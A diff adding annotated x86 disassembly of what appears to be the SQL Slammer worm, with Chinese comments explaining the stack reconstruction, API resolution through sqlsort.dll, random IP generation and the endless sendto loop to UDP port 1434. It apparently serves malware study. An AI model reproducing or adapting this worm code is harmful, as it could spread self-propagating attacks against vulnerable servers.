@@ -1,0 +1,170 @@
+jmp     short reconstruct; 此时，ESP=EIP。缓冲区溢出后，EIP=42B0C9DCh。42B0C9DCh处是
+                         ; 一条“JMP ESP”指令
+reconstruct: 
+push    42B0C9DCh        ; 缓冲区溢出后，堆栈中的ESP指针前面的数据包被破坏。这里， 
+                         ; 需要进行恢复，得到完整的数据包。首先，将42B0C9DCh压栈。
+mov     eax, 1010101h    ; 再将01010101h压栈24次。
+xor     ecx, ecx
+mov     cl, 18h
+
+fixup_payload: 
+push    eax
+loop    fixup_payload
+xor     eax, 5010101h   ; eax = 01010101h xor 05010101 h =04000000h 
+push    eax             ; 将04000000h压栈。
+mov     ebp, esp        ; EBP=ESP。至此，EBP+3指向的数据包完全恢复，如图7-19所示。
+                        ; 图7-19中带阴影的部分是需要由上面这些PUSH指令恢复的。
+                        ; 在后面的程序中可以看到，EBP+3指向的数据包被sendto()函数
+                        ; 发送到其它计算机。
+push    ecx             ; ECX=0
+push    6C6C642Eh
+push    32336C65h
+push    6E72656Bh       ; ESP=EBP-10H现在指向“kernel32.dll”字符串
+push    ecx
+push    746E756Fh 
+push    436B6369h
+push    54746547h       ; ESP=EBP-20H指向“GetTickCount”字符串
+mov     cx, 6C6Ch
+push    ecx             ; ecx = 00006C6Ch
+push    642E3233h 
+push    5F327377h       ; ESP=EBP-2CH指向“ws2_32.dll”字符串
+mov     cx, 7465h
+push    ecx             ; ecx = 00007465h
+push    6B636F73h       ; ESP=EBP-34H 指向“socket”字符串
+mov     cx, 6F74h
+push    ecx             ; ecx = 0000746fh
+push    646E6573h       ; ESP=EBP-3CH指向“sendto”字符串
+
+mov     esi, 42AE1018h  ; 42AE1018h属于sqlsort.dll的IAT表,其中的内容为
+                        ; LoadLibrary函数的地址
+lea     eax, [ebp-2Ch]  ; EBP-2CH及EAX指向堆栈中的“ws2_32.dll”字符串
+push    eax             ; EAX压栈作为LoadLibraryA函数的参数
+call    dword ptr [esi] ; 相当于: LoadLibraryA("ws2_32.dll")
+                        ; LoadLibraryA的原型为:
+                        ; WINBASEAPI HMODULE WINAPI LoadLibraryA(LPCSTR lpLibFileName);
+push    eax             ; EAX是LoadLibraryA()的返回值.即ws2_32.dll的模块地址
+                        ; 将EAX压栈, 保存在EBP-40H单元中。
+lea     eax, [ebp-20h]  ; EBP-20H及EAX指向堆栈中的“GetTickCount”字符串
+push    eax             ; 将EAX压栈,作为GetProcAddress()的第二个参数
+
+lea     eax, [ebp-10h]  ; EBP-10H及EAX指向堆栈中的“kernel32.dll”字符串
+push    eax             ; EAX压栈作为LoadLibraryA函数的参数
+call    dword ptr [esi] ; LoadLibrary("kernel32.dll")
+push    eax             ; EAX是LoadLibraryA()的返回值.即kernel32.dll的模块地址
+                        ; 将EAX压栈,作为GetProcAddress()的第一个参数
+mov     esi, 42AE1010h  ; 42AE1010h属于sqlsort.dll的IAT表,其中的内容应为
+                        ; GetProcAddress()函数的地址。但对某些版本(如2000.80.534.0)
+                        ; 的sqlsort.dll，地址42AE1018h中的内容为
+                        ; RtlEnterCriticalSection()函数的地址。程序在这里做一判断，
+                        ; 检查42AE1018h中的值是不是GetProcAddress()函数的地址。
+mov     ebx, [esi]      ; ebx是函数的地址
+mov     eax, [ebx]      ; 取出该函数体前面4个字节的内容 
+                        ;:u GetProcAddress
+                        ; KERNEL32!GetProcAddress
+                        ; 001B:77E5A5FD  55                  PUSH      EBP
+                        ; 001B:77E5A5FE  8BEC                MOV       EBP,ESP
+                        ; 001B:77E5A600  51                  PUSH      ECX
+                        ; 001B:77E5A601  51                  PUSH      ECX
+                        ; 001B:77E5A602  53                  PUSH      EBX
+                        ; 001B:77E5A603  57                  PUSH      EDI
+                        ; 001B:77E5A604  8B7D0C              MOV       EDI,[EBP+0C]
+cmp     eax, 51EC8B55h  ; 检查前4个字节是否为：55h,8Bh,ECh,51h
+jz      found_it        ; 如果相同，42AE1018h中的内容就是GetProcAddress()函数的地址
+mov     esi, 42AE101Ch  ; 否则，42AE101Ch中的内容是GetProcAddress()函数的地址
+                        ; 因此，可以针对不同的SQL版本取出正确的GetProcAddress()地址
+found_it: 
+call    dword ptr [esi] ; GetProcAddress(kernel32_base,GetTickCount)
+                        ; GetProcAddress的原型为:
+                        ; WINBASEAPI FARPROC WINAPI 
+                        ; GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
+call    eax             ; EAX是GetProcAddress的返回值。
+                        ; call eax就是调用GetTickCount()。GetTickCount()不需参数，
+                        ; 返回自计算机启动以后的毫秒数。这里将返回值作为随机数产生器
+                        ; 的一个种子(seed)。GetTickCount()的原型为:
+                        ; WINBASEAPI DWORD WINAPI GetTickCount( VOID );
+xor     ecx, ecx
+push    ecx             ; 将0压栈，保存于[EBP-44H]单元中
+push    ecx             ; 将0压栈，保存于[EBP-48H]单元中
+push    eax             ; 将种子压栈，保存于[EBP-4CH]单元中
+
+xor     ecx, 9B040103h  ; 
+xor     ecx, 01010101h
+push    ecx             ; ecx = 0x9B040103 xor 0x01010101 = 0x9A050002
+                        ; 0x59A = 1434，即SQL解析服务的端口号。
+lea     eax, [ebp-34h]  ; EBP-2CH及EAX指向堆栈中的"socket"字符串
+push    eax             ; 将EAX压栈,作为GetProcAddress()的第二个参数
+mov     eax, [ebp-40h]  ; [ebp-40h]是LoadLibraryA("ws2_32.dll")的返回值.即
+push    eax             ; 将EAX压栈,作为GetProcAddress()的第一个参数
+call    dword ptr [esi] ; GetProcAddress(ws2_32 base, "socket")
+                        ; EAX是GetProcAddress的返回值，即socket()函数的地址。
+                        ; socket()函数的原型为:
+                        ; SOCKET PASCAL FAR socket (int af, int type, int protocol);
+push    11h             ；#define IPPROTO_UDP  17 /* user datagram protocol */
+push    2               ；#define SOCK_DGRAM   2  /* datagram socket */
+push    2               ；#define AF_INET      2  /* internetwork: UDP, TCP, etc. */
+call    eax             ; socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)
+                        ; EAX返回由socket()创建的一个套接字
+push    eax             ; 将套接字压栈，保存于[EBP-54H]单元中
+
+lea     eax, [ebp-3Ch]  ; EBP-3CH及EAX指向堆栈中的"sendto"字符串
+push    eax             ; 将EAX压栈,作为GetProcAddress()的第一个参数
+mov     eax, [ebp-40h]  ; [ebp-40h]是LoadLibraryA("ws2_32.dll")的返回值
+push    eax             ; 将EAX压栈,作为GetProcAddress()的第一个参数
+call    dword ptr [esi] ; GetProcAddress(ws2_32 base,sendto) 
+                        ; EAX是GetProcAddress的返回值，即sendto()函数的地址。
+                        ; sendto()函数的原型为:
+                        ; int PASCAL FAR sendto (SOCKET s, char FAR * buf, int len,
+                        ; int flags,const struct sockaddr FAR *to, int tolen);
+mov     esi, eax        ; ESI中保存sendto()函数的地址
+
+or      ebx, ebx        ; ebx = 77F8313Ch
+xor     ebx, 0FFD9613Ch ; ebx = 88215000h or 88336870h或其他值
+
+rand_send: 
+mov     eax, [ebp-4Ch]  ; 取得毫秒数作为种子seed。
+
+lea     ecx, [eax+eax*2]; ecx = seed*3 mod 2^32
+lea     edx, [eax+ecx*4]; edx = seed*13 mod 2^32
+shl     edx, 4          ; edx = seed*208 mod 2^32
+add     edx, eax        ; edx = seed*209 mod 2^32
+shl     edx, 8          ; edx = seed*53504 mod 2^32
+sub     edx, eax        ; edx = seed*53503 mod 2^32
+lea     eax, [eax+edx*4]; eax = seed*214013 mod 2^32
+add     eax, ebx        ; eax = (seed*214013 + ebx) mod 2^32
+mov     [ebp-4Ch], eax  ; eax是这一轮产生的一个随机数，作为产生下一个随机数的种子
+                        ; eax作为IP地址
+
+                        ; 下面将sendto参数压栈.
+push    10h             ; 参数tolen = 16，即sizeof(struct sockaddr_in)
+lea     eax, [ebp-50h]  ; 
+push    eax             ; 参数to指向EBP-50H.
+                        ; to->sin_family = 0002h (EBP-50H)
+                        ; to->sin_port = 059ah (EBP-4EH)
+                        ; to->s_addr = 随机IP地址(EBP-4CH)
+                        ; to->sin_zero = 8个0字节(EBP-48H)
+
+                        ; struct in_addr {
+                        ;   union {
+                        ;           struct { u_char s_b1,s_b2,s_b3,s_b4; } S_un_b;
+                        ;           struct { u_short s_w1,s_w2; } S_un_w;
+                        ;           u_long S_addr;
+                        ;   } S_un; 
+                        ;#define s_addr S_un.S_addr /* for most tcp & ip code */
+                        ; struct sockaddr_in {
+                        ;         short   sin_family;
+                        ;         u_short sin_port;
+                        ;         struct  in_addr sin_addr;
+                        ;         char    sin_zero[8];
+                        ; };
+xor     ecx, ecx        ; 参数flags = 0
+push    ecx
+xor     cx, 178h        ; ecx=376
+push    ecx             ; 参数len = 376, 数据包的长度为376字节
+lea     eax, [ebp+3] 
+push    eax             ; 参数buf = EBP+3，指向蠕虫的数据包
+mov     eax, [ebp-54h]  ; [EBP-54H]单元中保存的是由socket()创建的套接字，
+push    eax             ; 参数s = 套接字
+call    esi             ; sendto(sock,payload,376,0,sock_addr struct, 16)
+                        ; 调用sendto()向一个随机IP地址发送数据包。若该主机上存在
+                        ; SQL漏洞，将导致其缓冲区溢出，并运行与本程序相同的代码
+jmp     short rand_send ; 不断产生随机IP地址并发起攻击
